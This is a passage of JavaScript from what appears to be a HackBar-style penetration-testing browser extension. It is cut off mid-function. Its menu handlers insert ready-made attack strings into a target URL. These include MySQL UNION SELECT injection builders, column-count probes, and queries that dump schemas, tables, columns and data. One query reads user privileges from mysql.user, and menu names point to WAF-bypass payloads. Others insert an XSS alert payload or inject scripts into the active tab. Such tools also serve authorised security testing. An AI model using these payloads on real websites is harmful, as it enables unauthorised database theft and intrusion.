binaryencodeBtn.addEventListener('click', anonClickMenuFunct, false);
binarydecodeBtn.addEventListener('click', anonClickMenuFunct, false);
stripslashesBtn.addEventListener('click', anonClickMenuFunct, false);
stripspacesBtn.addEventListener('click', anonClickMenuFunct, false);
extractlinksBtn.addEventListener('click', anonClickMenuFunct, false);
strreverseBtn.addEventListener('click', anonClickMenuFunct, false);
strcharcodeBtn.addEventListener('click', anonClickMenuFunct, false);
htmlcharsBtn.addEventListener('click', anonClickMenuFunct, false);
xssalertBtn.addEventListener('click', anonClickMenuFunct, false);
autoxsspolyBtn.addEventListener('click', anonClickMenuFunct, false);
autoxsscustomBtn.addEventListener('click', anonClickMenuFunct, false);
mysqlcharBtn.addEventListener('click', anonClickMenuFunct, false);
mssqlcharBtn.addEventListener('click', anonClickMenuFunct, false);
oraclecharBtn.addEventListener('click', anonClickMenuFunct, false);
//unionselectstmntBtn.addEventListener('click', anonClickMenuFunct, false);
//spaces2commentsBtn.addEventListener('click', anonClickMenuFunct, false);
extractcommentsBtn.addEventListener('click', anonClickMenuFunct, false);
extractregexpBtn.addEventListener('click', anonClickMenuFunct, false);
stripcustomBtn.addEventListener('click', anonClickMenuFunct, false);

sqlMenuBtn.addEventListener('mouseover',onMouseOverMenu,false);
convUtf.addEventListener('click',anonClickMenuFunct,false);
convLat.addEventListener('click',anonClickMenuFunct,false);
casT.addEventListener('click',anonClickMenuFunct,false);
unHex.addEventListener('click',anonClickMenuFunct,false);
unCmp.addEventListener('click',anonClickMenuFunct,false);
pluS.addEventListener('click',anonClickMenuFunct,false);
commT.addEventListener('click',anonClickMenuFunct,false);
clR.addEventListener('click',anonClickMenuFunct,false);
ciT.addEventListener('click',anonClickMenuFunct,false);
ciS.addEventListener('click',anonClickMenuFunct,false);
collSet.addEventListener('click',anonClickMenuFunct,false);
hostName.addEventListener('click',anonClickMenuFunct,false);
innoDb.addEventListener('click',anonClickMenuFunct,false);
operatorS.addEventListener('click',anonClickMenuFunct,false);
portSql.addEventListener('click',anonClickMenuFunct,false);
recoverOption.addEventListener('click',anonClickMenuFunct,false);
serverOsType.addEventListener('click',anonClickMenuFunct,false);
sysLink.addEventListener('click',anonClickMenuFunct,false);
timeoutConn.addEventListener('click',anonClickMenuFunct,false);
timeoutWait.addEventListener('click',anonClickMenuFunct,false);
lpaD.addEventListener('click',anonClickMenuFunct,false);
repE.addEventListener('click',anonClickMenuFunct,false);
ifS.addEventListener('click',anonClickMenuFunct,false);
csW.addEventListener('click',anonClickMenuFunct,false);

orderBy1.addEventListener('click',anonClickMenuFunct,false);
groupBy1.addEventListener('click',anonClickMenuFunct,false);
procAnalyze1.addEventListener('click',anonClickMenuFunct,false);
selectFromSelect.addEventListener('click',anonClickMenuFunct,false);
Int1.addEventListener('click',anonClickMenuFunct,false);
Null1.addEventListener('click',anonClickMenuFunct,false);
Int2.addEventListener('click',anonClickMenuFunct,false);
Udv.addEventListener('click',anonClickMenuFunct,false);
Countdb1.addEventListener('click',anonClickMenuFunct,false);
Ispriv.addEventListener('click',anonClickMenuFunct,false);
Msst.addEventListener('click',anonClickMenuFunct,false);
Grq.addEventListener('click',anonClickMenuFunct,false);
Dn_Groupconc.addEventListener('click',anonClickMenuFunct,false);
Dn_Oneshot.addEventListener('click',anonClickMenuFunct,false);
Tn_Groupconc.addEventListener('click',anonClickMenuFunct,false);
Tn_Oneshot.addEventListener('click',anonClickMenuFunct,false);
Cn_Groupconc.addEventListener('click',anonClickMenuFunct,false);
Cn_Oneshot.addEventListener('click',anonClickMenuFunct,false);
D_Groupconc.addEventListener('click',anonClickMenuFunct,false);
D_Oneshot.addEventListener('click',anonClickMenuFunct,false);
Db_Madblood.addEventListener('click',anonClickMenuFunct,false);
Db_Tpro.addEventListener('click',anonClickMenuFunct,false);
Db_Zen.addEventListener('click',anonClickMenuFunct,false);
Db_Makmanwaf.addEventListener('click',anonClickMenuFunct,false);
Db_Trojanwaf.addEventListener('click',anonClickMenuFunct,false);
Db_Madbloodwaf1.addEventListener('click',anonClickMenuFunct,false);
Db_Madbloodwaf2.addEventListener('click',anonClickMenuFunct,false);
Db_Trojbenchmark.addEventListener('click',anonClickMenuFunct,false);
Db_Rooth3X49.addEventListener('click',anonClickMenuFunct,false);
Db_Replace.addEventListener('click',anonClickMenuFunct,false);
Db_Makman.addEventListener('click',anonClickMenuFunct,false);
Db_Ajkaro.addEventListener('click',anonClickMenuFunct,false);
Db_Zenwaf.addEventListener('click',anonClickMenuFunct,false);
Db_Waf.addEventListener('click',anonClickMenuFunct,false);
Db_Rummy.addEventListener('click',anonClickMenuFunct,false);
Postgre84.addEventListener('click',anonClickMenuFunct,false);
Postgre91.addEventListener('click',anonClickMenuFunct,false);
Postgreall.addEventListener('click',anonClickMenuFunct,false);
Db_Rummy_Zen.addEventListener('click',anonClickMenuFunct,false);
Db_Names1.addEventListener('click',anonClickMenuFunct,false);
Db_Count1.addEventListener('click',anonClickMenuFunct,false);
Pdbtc.addEventListener('click',anonClickMenuFunct,false);
Pdbcc.addEventListener('click',anonClickMenuFunct,false);
Idbtc.addEventListener('click',anonClickMenuFunct,false);
Icc.addEventListener('click',anonClickMenuFunct,false);
Getversion1.addEventListener('click',anonClickMenuFunct,false);
Getdb.addEventListener('click',anonClickMenuFunct,false);
Gettable1.addEventListener('click',anonClickMenuFunct,false);
Getcolumn1.addEventListener('click',anonClickMenuFunct,false);
Getdata1.addEventListener('click',anonClickMenuFunct,false);
Getversion2.addEventListener('click',anonClickMenuFunct,false);
Gettable2.addEventListener('click',anonClickMenuFunct,false);
Dios1.addEventListener('click',anonClickMenuFunct,false);
Dios2.addEventListener('click',anonClickMenuFunct,false);
Dios3.addEventListener('click',anonClickMenuFunct,false);
Dios4.addEventListener('click',anonClickMenuFunct,false);
Getversion3.addEventListener('click',anonClickMenuFunct,false);
Gettable3.addEventListener('click',anonClickMenuFunct,false);
Dios21.addEventListener('click',anonClickMenuFunct,false);
Dios22.addEventListener('click',anonClickMenuFunct,false);
Dios23.addEventListener('click',anonClickMenuFunct,false);
Dios24.addEventListener('click',anonClickMenuFunct,false);
Dios25.addEventListener('click',anonClickMenuFunct,false);
Dios26.addEventListener('click',anonClickMenuFunct,false);
Dios27.addEventListener('click',anonClickMenuFunct,false);
Dios28.addEventListener('click',anonClickMenuFunct,false);
Dios29.addEventListener('click',anonClickMenuFunct,false);
Getversion4.addEventListener('click',anonClickMenuFunct,false);
Getdb2.addEventListener('click',anonClickMenuFunct,false);
Gettable4.addEventListener('click',anonClickMenuFunct,false);
Getcolumn2.addEventListener('click',anonClickMenuFunct,false);
Getdata2.addEventListener('click',anonClickMenuFunct,false);

Waf1.addEventListener('click',anonClickMenuFunct,false);
Waf2.addEventListener('click',anonClickMenuFunct,false);
Waf3.addEventListener('click',anonClickMenuFunct,false);
Waf4.addEventListener('click',anonClickMenuFunct,false);
Waf5.addEventListener('click',anonClickMenuFunct,false);
Waf_Gett.addEventListener('click',anonClickMenuFunct,false);
Waf_Getc.addEventListener('click',anonClickMenuFunct,false);
Waf_Gettos.addEventListener('click',anonClickMenuFunct,false);
Waf_Getcos.addEventListener('click',anonClickMenuFunct,false);

Html0.addEventListener('click',anonClickMenuFunct,false);
Html1.addEventListener('click',anonClickMenuFunct,false);
Html2.addEventListener('click',anonClickMenuFunct,false);
Html3.addEventListener('click',anonClickMenuFunct,false);
Html4.addEventListener('click',anonClickMenuFunct,false);
Html5.addEventListener('click',anonClickMenuFunct,false);
Html6.addEventListener('click',anonClickMenuFunct,false);
Html7.addEventListener('click',anonClickMenuFunct,false);
Html8.addEventListener('click',anonClickMenuFunct,false);
Html9.addEventListener('click',anonClickMenuFunct,false);
Html10.addEventListener('click',anonClickMenuFunct,false);
Html11.addEventListener('click',anonClickMenuFunct,false);

Xs0.addEventListener('click',anonClickMenuFunct,false);
Xs1.addEventListener('click',anonClickMenuFunct,false);
Xs2.addEventListener('click',anonClickMenuFunct,false);
Xs3.addEventListener('click',anonClickMenuFunct,false);
Xs4.addEventListener('click',anonClickMenuFunct,false);
Xs5.addEventListener('click',anonClickMenuFunct,false);
Xs6.addEventListener('click',anonClickMenuFunct,false);
Xs7.addEventListener('click',anonClickMenuFunct,false);
Xs8.addEventListener('click',anonClickMenuFunct,false);
Xs9.addEventListener('click',anonClickMenuFunct,false);
Xs10.addEventListener('click',anonClickMenuFunct,false);
Xs11.addEventListener('click',anonClickMenuFunct,false);
Xs12.addEventListener('click',anonClickMenuFunct,false);
Xs13.addEventListener('click',anonClickMenuFunct,false);
Xs14.addEventListener('click',anonClickMenuFunct,false);
Xs15.addEventListener('click',anonClickMenuFunct,false);
Xs16.addEventListener('click',anonClickMenuFunct,false);
Xs17.addEventListener('click',anonClickMenuFunct,false);
Xs18.addEventListener('click',anonClickMenuFunct,false);
Xs19.addEventListener('click',anonClickMenuFunct,false);
Xs20.addEventListener('click',anonClickMenuFunct,false);
Xs21.addEventListener('click',anonClickMenuFunct,false);
Xs22.addEventListener('click',anonClickMenuFunct,false);
Xs23.addEventListener('click',anonClickMenuFunct,false);
Xs24.addEventListener('click',anonClickMenuFunct,false);
Xs25.addEventListener('click',anonClickMenuFunct,false);
Xs26.addEventListener('click',anonClickMenuFunct,false);
Xs27.addEventListener('click',anonClickMenuFunct,false);
Xs28.addEventListener('click',anonClickMenuFunct,false);
Xs29.addEventListener('click',anonClickMenuFunct,false);
Xs30.addEventListener('click',anonClickMenuFunct,false);
Xs31.addEventListener('click',anonClickMenuFunct,false);
Xs32.addEventListener('click',anonClickMenuFunct,false);
Xs33.addEventListener('click',anonClickMenuFunct,false);
Xs34.addEventListener('click',anonClickMenuFunct,false);
Xs35.addEventListener('click',anonClickMenuFunct,false);
Xs36.addEventListener('click',anonClickMenuFunct,false);
Xs37.addEventListener('click',anonClickMenuFunct,false);
Xs38.addEventListener('click',anonClickMenuFunct,false);
Xs39.addEventListener('click',anonClickMenuFunct,false);
Xs40.addEventListener('click',anonClickMenuFunct,false);
Xs41.addEventListener('click',anonClickMenuFunct,false);
Xs42.addEventListener('click',anonClickMenuFunct,false);
Xs43.addEventListener('click',anonClickMenuFunct,false);
Xs44.addEventListener('click',anonClickMenuFunct,false);
Xs45.addEventListener('click',anonClickMenuFunct,false);
Xs46.addEventListener('click',anonClickMenuFunct,false);
Xs47.addEventListener('click',anonClickMenuFunct,false);
Xs48.addEventListener('click',anonClickMenuFunct,false);
Xs49.addEventListener('click',anonClickMenuFunct,false);
Xs50.addEventListener('click',anonClickMenuFunct,false);
Xs51.addEventListener('click',anonClickMenuFunct,false);
Xs52.addEventListener('click',anonClickMenuFunct,false);
Xs53.addEventListener('click',anonClickMenuFunct,false);
Xs54.addEventListener('click',anonClickMenuFunct,false);
Xs55.addEventListener('click',anonClickMenuFunct,false);
Xs56.addEventListener('click',anonClickMenuFunct,false);
Xs57.addEventListener('click',anonClickMenuFunct,false);
Xs58.addEventListener('click',anonClickMenuFunct,false);
Xs59.addEventListener('click',anonClickMenuFunct,false);
Xs60.addEventListener('click',anonClickMenuFunct,false);
Xs61.addEventListener('click',anonClickMenuFunct,false);
Xs62.addEventListener('click',anonClickMenuFunct,false);
Xs63.addEventListener('click',anonClickMenuFunct,false);
Xs64.addEventListener('click',anonClickMenuFunct,false);
Xs65.addEventListener('click',anonClickMenuFunct,false);
Xs66.addEventListener('click',anonClickMenuFunct,false);
Xs67.addEventListener('click',anonClickMenuFunct,false);
Xs68.addEventListener('click',anonClickMenuFunct,false);
Xs69.addEventListener('click',anonClickMenuFunct,false);
Xs70.addEventListener('click',anonClickMenuFunct,false);
Xs71.addEventListener('click',anonClickMenuFunct,false);
Xs72.addEventListener('click',anonClickMenuFunct,false);
Xs73.addEventListener('click',anonClickMenuFunct,false);
Xs74.addEventListener('click',anonClickMenuFunct,false);
Xs75.addEventListener('click',anonClickMenuFunct,false);
Xs76.addEventListener('click',anonClickMenuFunct,false);
Xs77.addEventListener('click',anonClickMenuFunct,false);
Xs78.addEventListener('click',anonClickMenuFunct,false);
Xs79.addEventListener('click',anonClickMenuFunct,false);
Xs80.addEventListener('click',anonClickMenuFunct,false);
Xs81.addEventListener('click',anonClickMenuFunct,false);
Xs82.addEventListener('click',anonClickMenuFunct,false);
Xs83.addEventListener('click',anonClickMenuFunct,false);
Xs84.addEventListener('click',anonClickMenuFunct,false);
Xs85.addEventListener('click',anonClickMenuFunct,false);
Xs86.addEventListener('click',anonClickMenuFunct,false);
Xs87.addEventListener('click',anonClickMenuFunct,false);
Xs88.addEventListener('click',anonClickMenuFunct,false);
Xs89.addEventListener('click',anonClickMenuFunct,false);
Xs90.addEventListener('click',anonClickMenuFunct,false);
Xs91.addEventListener('click',anonClickMenuFunct,false);
Xs92.addEventListener('click',anonClickMenuFunct,false);
Xs93.addEventListener('click',anonClickMenuFunct,false);
Xs94.addEventListener('click',anonClickMenuFunct,false);
Xs95.addEventListener('click',anonClickMenuFunct,false);
Xs96.addEventListener('click',anonClickMenuFunct,false);
Xs97.addEventListener('click',anonClickMenuFunct,false);
Xs98.addEventListener('click',anonClickMenuFunct,false);
Xs99.addEventListener('click',anonClickMenuFunct,false);
Xs100.addEventListener('click',anonClickMenuFunct,false);
Xs101.addEventListener('click',anonClickMenuFunct,false);
Xs102.addEventListener('click',anonClickMenuFunct,false);
Xs103.addEventListener('click',anonClickMenuFunct,false);
Xs104.addEventListener('click',anonClickMenuFunct,false);
Xs105.addEventListener('click',anonClickMenuFunct,false);
Xs106.addEventListener('click',anonClickMenuFunct,false);
Xs107.addEventListener('click',anonClickMenuFunct,false);
Xs108.addEventListener('click',anonClickMenuFunct,false);
Xs109.addEventListener('click',anonClickMenuFunct,false);
Xs110.addEventListener('click',anonClickMenuFunct,false);
Xs111.addEventListener('click',anonClickMenuFunct,false);
Xs112.addEventListener('click',anonClickMenuFunct,false);
Xs113.addEventListener('click',anonClickMenuFunct,false);
Xs114.addEventListener('click',anonClickMenuFunct,false);
Xs115.addEventListener('click',anonClickMenuFunct,false);
Xs116.addEventListener('click',anonClickMenuFunct,false);
Xs117.addEventListener('click',anonClickMenuFunct,false);
Xs118.addEventListener('click',anonClickMenuFunct,false);
Xs119.addEventListener('click',anonClickMenuFunct,false);
Xs120.addEventListener('click',anonClickMenuFunct,false);
Xs121.addEventListener('click',anonClickMenuFunct,false);
Xs122.addEventListener('click',anonClickMenuFunct,false);
Xs123.addEventListener('click',anonClickMenuFunct,false);
Xs124.addEventListener('click',anonClickMenuFunct,false);
Xs125.addEventListener('click',anonClickMenuFunct,false);
Xs126.addEventListener('click',anonClickMenuFunct,false);
Xs127.addEventListener('click',anonClickMenuFunct,false);
Xs128.addEventListener('click',anonClickMenuFunct,false);

Link1.addEventListener('click',anonClickMenuFunct,false);
Link2.addEventListener('click',anonClickMenuFunct,false);
Link3.addEventListener('click',anonClickMenuFunct,false);
Link4.addEventListener('click',anonClickMenuFunct,false);
Link5.addEventListener('click',anonClickMenuFunct,false);
Link6.addEventListener('click',anonClickMenuFunct,false);
Link7.addEventListener('click',anonClickMenuFunct,false);
Link8.addEventListener('click',anonClickMenuFunct,false);
Link9.addEventListener('click',anonClickMenuFunct,false);
Link10.addEventListener('click',anonClickMenuFunct,false);


postdataCbx.addEventListener('change', togglepostdata);
refererCbx.addEventListener('change', togglereferer);

anonFocusFunct = function (event) { onFieldFocus( event );}
urlfield.addEventListener('focus', anonFocusFunct, false );
postdatafield.addEventListener('focus', anonFocusFunct, false );
refererfield.addEventListener('focus', anonFocusFunct, false );
urlfield.addEventListener('click', onFieldClick, false );
postdatafield.addEventListener('click', onFieldClick, false );
refererfield.addEventListener('click', onFieldClick, false );

function onFieldFocus ( event ){
  currentFocusField = event.currentTarget;
}

function onFieldClick ( event ){
  event.currentTarget.focus();
}

function onMouseOverMenu(event) {
  var dropdowns = document.getElementsByClassName("dropdown-content");
  var i;
  for (i = 0; i < dropdowns.length; i++) {
    var openDropdown = dropdowns[i];
    openDropdown.style.visibility = "visible";
  }
}

function onClickMenu(event) {
  switch(event.currentTarget.name){
    case 'base64encode':
      var txt = this.getSelectedText();
      var newString = Encrypt.base64Encode(txt);
      this.setSelectedText(newString);
      break;
    case 'base64decode':
      var txt = this.getSelectedText();
      var newString = Encrypt.base64Decode(txt);
      this.setSelectedText(newString);
      break;
    case 'urlencode':
      var txt = this.getSelectedText();
      var newString = urlencode(txt);
      this.setSelectedText( newString );
      break;
    case 'urldecode':
      var txt = this.getSelectedText();
      var newString = unescape(txt);
      this.setSelectedText( newString );
      break;
    case 'md5hash':
      var txt = this.getSelectedText();
      var newString = Encrypt.md5(txt);
      this.setSelectedText( newString );
      break;
    case 'sha1hash':
      var txt = this.getSelectedText();
      var newString = Encrypt.sha1(txt);
      this.setSelectedText( newString );
      break;
    case 'sha256hash':
      var txt = this.getSelectedText();
      var newString = Encrypt.sha2(txt);
      this.setSelectedText( newString );
      break;
    case 'rot13':
      var txt = this.getSelectedText();
      var newString = Encrypt.rot13(txt);
      this.setSelectedText( newString );
      break;
    case 'hexencode':
      var txt = this.getSelectedText();
      var newString = Encrypt.strToHex(txt);
      this.setSelectedText( newString );
      break;
    case 'hexdecode':
      var txt = this.getSelectedText();
      var newString = Encrypt.hexToStr(txt);
      this.setSelectedText( newString );
      break;
    case 'binaryencode':
      var txt = this.getSelectedText();
      var newString = Encrypt.toBinary(txt);
      this.setSelectedText( newString );
      break;
    case 'binarydecode':
      var txt = this.getSelectedText();
      var newString = Encrypt.fromBinary(txt);
      this.setSelectedText( newString );
      break;
    case 'stripslashes':
      var txt = this.getSelectedText();
      var re = new RegExp("/", 'g');
      var newString = txt.replace(re, '');
      this.setSelectedText( newString );      
      break;
    case 'stripspaces':
      var txt = this.getSelectedText();
      var re = new RegExp(" ", 'g');
      var newString = txt.replace(re, '');
      this.setSelectedText( newString ); 
      break;
    case 'extractlinks':
      browser.tabs.query({active:true,currentWindow:true}).then(function(tabs){
        var currentTabUrl = tabs[0].url;
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          // Action to be performed when the document is read;
          var rawHTML = xhttp.responseText;
          var re = new RegExp("[https]+\:\/\/[a-zA-Z0-9\-\.\_]+\/[a-zA-Z0-9\-\.\_/]+", 'g');
          var result;
          while (result = re.exec(rawHTML)){
            urlfield.value += result + "\n";
          }
        }
        };
        xhttp.open("GET", currentTabUrl, true);
        xhttp.send(); 
      });
      break;
    case 'strreverse':
      var txt = this.getSelectedText();
      var newString = txt.split("").reverse().join("");
      this.setSelectedText( newString ); 
      break;
    case 'strcharcode':
      var txt = this.getSelectedText();
      var chars = txt.split("");
      output = "";
      for(i=0;i<chars.length;i++){
        var code = String.charCodeAt(chars[i]);
        output += code+",";
      }
      var newString = "String.fromCharCode("+output+")";
      newString = newString.replace(",)",")");
      this.setSelectedText( newString );
      break;
    case 'htmlchars':
      var txt = this.getSelectedText();
      var chars = txt.split("");
      var output = "";
      for(i=0;i<chars.length;i++){
        var code = String.charCodeAt(chars[i]);
        output += "&#"+code+";";
      }
      this.setSelectedText( output );
      break;
    case 'xssalert':
      var txt = this.getSelectedText();
      var newString = "<script>alert('"+txt+"')</script>";
      this.setSelectedText( newString );
      break;
    case 'autoxsspoly':
    var auto = browser.tabs.executeScript({
      file: 'polyglot.js'
    });
      break;
    case 'autoxsscustom':
      var auto = browser.tabs.executeScript({
        file: 'custom.js'
      });
      break;
    case 'mysqlchar':
      var txt = this.getSelectedText();
      this.setSelectedText(SQL.selectionToSQLChar("mysql", txt));
      break;
    case 'mssqlchar':
      var txt = this.getSelectedText();
      var newString = "";
      this.setSelectedText(SQL.selectionToSQLChar("mssql", txt)); 
      break;
    case 'oraclechar':
      var txt = this.getSelectedText();
      var newString = "";
      this.setSelectedText(SQL.selectionToSQLChar("oracle", txt));
      break;
    case 'unionselectstmnt':
      this.setSelectedText(SQL.selectionToUnionSelect()); 
      break;
    case 'spaces2comments':
      var txt = this.getSelectedText();
      this.setSelectedText(SQL.selectionToInlineComments(txt)); 
      break;
    case 'extractcomments':
      browser.tabs.query({active:true,currentWindow:true}).then(function(tabs){
        var currentTabUrl = tabs[0].url;
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          // Action to be performed when the document is read;
          var rawHTML = xhttp.responseText;
          var re =  new RegExp("<!--[^<]+-->", 'g');
          var re2 = new RegExp("\/\*.+\*\/", 'g');
          var result;
          while (result = re.exec(rawHTML)){
            urlfield.value += result + "\n";
          }
          while (result = re2.exec(rawHTML)){
            urlfield.value += result + "\n";
          }
        }
        };
        xhttp.open("GET", currentTabUrl, true);
        xhttp.send(); 
      });
      break;
    case "extractregexp":
    browser.tabs.query({active:true,currentWindow:true}).then(function(tabs){
      var term = prompt("Regex:");
      var currentTabUrl = tabs[0].url;
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        // Action to be performed when the document is read;
        var rawHTML = xhttp.responseText;
        var re =  new RegExp(term, 'g');
        var result;
        while (result = re.exec(rawHTML)){
          urlfield.value += result + "\n";
        }
      }
      };
      xhttp.open("GET", currentTabUrl, true);
      xhttp.send(); 
    });
    break;
  case "stripcustom":
    var str = prompt("String you would like to remove:")
    var txt = this.getSelectedText();
    var re = new RegExp(str, 'g');
    var newString = txt.replace(re, '');
    this.setSelectedText( newString ); 
    break;

  case "convutf":
    var txt=this.getSelectedText();
    var newString='CONVERT('+txt+' USING utf8)';
    this.setSelectedText(newString);
    break;

  case "convlat":
    var txt=this.getSelectedText();
    var newString='CONVERT('+txt+' USING latin1)';
    this.setSelectedText(newString);
    break;
  
  case "cast":
  	var txt=this.getSelectedText();
    var newString='cast('+txt+')';
    this.setSelectedText(newString);
    break;
	
  case "unhx":
  	var txt=this.getSelectedText();
    var newString='unhex(hex('+txt+'))';
    this.setSelectedText(newString);
    break;

  case "uncmp":
  	var txt=this.getSelectedText();
    var newString='uncompress(compress('+txt+'))';
    this.setSelectedText(newString);
    break;

  case "plus":
  	var txt=this.getSelectedText();
  	txt = txt.split(' ').join('+');
	this.setSelectedText(txt);
    break;  	

  case "comment":
  	var txt=this.getSelectedText();
  	txt = txt.split(' ').join('/**/');
	this.setSelectedText(txt);
    break;  	

  case "clr":
  	var txt=this.getSelectedText();
  	txt = txt.split('+').join(' ');
  	txt = txt.split('/**/').join(' ');
	this.setSelectedText(txt);
    break; 

  case "cit":
  	txt = 'IF((@@LOWER_CASE_TABLE_NAMES)=0,0x594553,0x4e4f)';
	this.setSelectedText(txt);
    break; 

  case "cis":
  	txt = 'IF((@@LOWER_CASE_FILE_SYSTEM)=0,0x594553,0x4e4f)';
	this.setSelectedText(txt);
    break;
  case "coll-set":
  	txt = '@@COLLATION_CONNECTION';
	this.setSelectedText(txt);
    break; 

  case "hn":
	txt = "@@HOSTNAME";
	this.setSelectedText(txt);
	break;

  case "inndb":
	txt = "@@HAVE_INNODB";
	this.setSelectedText(txt);
	break;

  case "opertrs":
	txt = "@@FT_BOOLEAN_SYNTAX";
	this.setSelectedText(txt);
	break;
  case "portsql":
	txt = "@@PORT";
	this.setSelectedText(txt);
	break;

  case "recoption":
	txt = "@@MYISAM_RECOVER_OPTIONS";
	this.setSelectedText(txt);
	break;

  case "sot":
	txt = "@@VERSION_COMPILE_OS";
	this.setSelectedText(txt);
	break;

  case "syml":
  	txt = "@@HAVE_SYMLINK";
	this.setSelectedText(txt);
	break;

  case "toc":
	txt = "@@WAIT_TIMEOUT";
	this.setSelectedText(txt);
	break;

  case "tow":
	txt = "@@WAIT_TIMEOUT";
	this.setSelectedText(txt);
	break;

  case "lpad":
  	var txt=this.getSelectedText();
	txt = "LPAD("+txt+",2,0x30)";
	this.setSelectedText(txt);
	break;

  case "repe":
  	var txt=this.getSelectedText();
	txt = "REPEAT("+txt+",5)";
	this.setSelectedText(txt);
	break;

  case "ifs":
  	var txt=this.getSelectedText();
	txt = "IF(("+txt+")>-1,0x00,0x00)";
	this.setSelectedText(txt);
	break;

  case "csw":
  	var txt=this.getSelectedText();
	txt = "CASE+WHEN+("+txt+")+THEN+1+ELSE+2+END";
	this.setSelectedText(txt);
	break;

  case "ob1":
	txt = "+ORDER+BY+1";
	this.setSelectedText(txt);
	break;

  case "gb1":
    var index = prompt("Enter n:");
    var tmp="";

    for(var i=1;i<=index;i++){
    	if(i<index)
    		tmp=tmp+i+",";
    	else if(i==index)
    		tmp=tmp+i;
    }

	txt = "+GROUP+BY+"+tmp;
	this.setSelectedText(txt);
	break;

  case "pa1":
	txt = "+PROCEDURE+ANALYSE()";
	this.setSelectedText(txt);
	break;

  case "s*s1":
  	var txt = this.getSelectedText();
	txt = "'+AND+(SELECT * FROM "+txt+")=(SELECT 1)--+";
	this.setSelectedText(txt);
	break;

  case "int1":
    var index = prompt("Amount of columns to use in UNION SELECT statement");
    var tmp="";

    for(var i=1;i<=index;i++){
    	if(i<index)
    		tmp=tmp+i+",";
    	else if(i==index)
    		tmp=tmp+i;
    }

	txt = "+UNION+ALL+SELECT+"+tmp;
	this.setSelectedText(txt);
	break;

  case "null1":
    var index = prompt("Amount of columns to use in UNION SELECT statement");
    var tmp="";

    for(var i=1;i<=index;i++){
    	if(i<index)
    		tmp=tmp+"null"+",";
    	else if(i==index)
    		tmp=tmp+"null--+-";
    }

	txt = "+UNION+ALL+SELECT+"+tmp;
	this.setSelectedText(txt);
	break;

  case "int2":
    var index = prompt("Amount of columns to use in UNION SELECT statement");
    var tmp="";

    for(var i=1;i<=index;i++){
    	if(i<index)
    		tmp=tmp+'('+i+')'+",";
    	else if(i==index)
    		tmp=tmp+'('+i+')'+")";
    }

	txt = "+UNION(SELECT"+tmp;
	this.setSelectedText(txt);
	break;

  case "udv":
	txt = "CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION())";
	this.setSelectedText(txt);
	break;

  case "countdb1":
	txt = "(SELECT+CONCAT(COUNT(schema_name),0x202f20446174616261736573)+FROM+INFORMATION_SCHEMA.SCHEMATA)";
	this.setSelectedText(txt);
	break;

  case "ispriv":
	txt = "(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)";
	this.setSelectedText(txt);
	break;

  case "msst":
	txt = "(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e)+FROM+mysql.user)";
	this.setSelectedText(txt);
	break;

  case "grq":
	txt = "(SELECT+CONCAT(info)+FROM+INFORMATION_SCHEMA.PROCESSLIST)";
	this.setSelectedText(txt);
	break;

  case "dn_groupconc":
	txt = "(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)";
	this.setSelectedText(txt);
	break;

  case "dn_oneshot":
	txt = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)";
	this.setSelectedText(txt);
	break;

  case "tn_groupconc":
  	var txt=prompt("Database Name :")
	txt = "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA="+Encrypt.strToHex(txt)+')';
	this.setSelectedText(txt);
	break;

  case "tn_oneshot":
	txt = "(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x)";
	this.setSelectedText(txt);
	break;

  case "cn_groupconc":
  	var txt=prompt("Table Name :")
	txt = "(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME="+Encrypt.strToHex(txt)+')';
	this.setSelectedText(txt);
	break;

  case "cn_oneshot":
  	var txt=prompt("Table Name :")
	txt = "(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME="+Encrypt.strToHex(txt)+')AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x3c62723e)))))x)';
	this.setSelectedText(txt);
	break;

  case "d_groupconc":
  	var temdbname = prompt('Insert db name (or leave for current DB())','DATABASE()');
  	var temtablename = prompt('Insert table name','TABLE_NAME to dump');
  	var temcolname = prompt('Insert columns to dump','column_1,column_2,column_3');
  	
  	if (!temdbname.localeCompare('DATABASE()')) {
  		txt = "(SELECT+GROUP_CONCAT("+temcolname+'+SEPARATOR+0x3c62723e)+FROM+'+temtablename+')';	
  	}
	else{
		txt = "(SELECT+GROUP_CONCAT("+temcolname+'+SEPARATOR+0x3c62723e)+FROM+'+temdbname+'.'+temtablename+')';	
	}

	this.setSelectedText(txt);
	break;

  case "d_oneshot":
  	var temdbname = prompt('Insert db name (or leave for current DB())','DATABASE()');
  	var temtablename = prompt('Insert table name','TABLE_NAME to dump');
  	var temcolname = prompt('Insert columns to dump','column_1,column_2,column_3');
  	
  	if (!temdbname.localeCompare('DATABASE()')) {
